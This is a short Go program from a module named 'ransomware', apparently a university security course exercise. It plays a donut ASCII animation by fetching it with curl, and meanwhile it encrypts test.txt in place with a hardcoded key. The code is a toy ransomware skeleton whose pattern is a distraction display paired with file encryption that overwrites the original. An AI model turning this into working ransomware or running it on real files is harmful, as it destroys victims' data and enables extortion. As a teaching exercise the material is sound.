package main

import (
	"fmt"
	"os"

	donut "ransomware/donut"
	encrypt "ransomware/encrypt"
)

func main() {
	// Crea una nueva terminal
	terminal := donut.NewTerminal()
	defer terminal.Close()

	// Canal para coordinar la finalización de la encriptación
	done := make(chan struct{})

	// Goroutine para mostrar el arte ASCII de un donut
	go func() {
		err := terminal.RunCommand("curl", "ascii.live/donut")
		if err != nil {
			fmt.Println("Error ejecutando el comando:", err)
			os.Exit(1)
		}
	}()

	// Goroutine para encriptar el archivo
	go func() {
		defer close(done)

		inputPath := "test.txt"
		outputPath := "test.txt"
		key := []byte("---seguridad_informatica__UAO---")

		// Aquí capturamos el error que devuelve EncryptFile
		if err := encrypt.EncryptFile(inputPath, outputPath, key); err != nil {
			fmt.Println("Error al encriptar el archivo:", err)
			os.Exit(1)
		}

		fmt.Println("Archivo encriptado correctamente.")
	}()

	// Espera hasta que la encriptación haya finalizado
	<-done
	// Detiene la ejecución de la dona en la terminal
	fmt.Println("Programa terminado.")
	os.Exit(0)
}
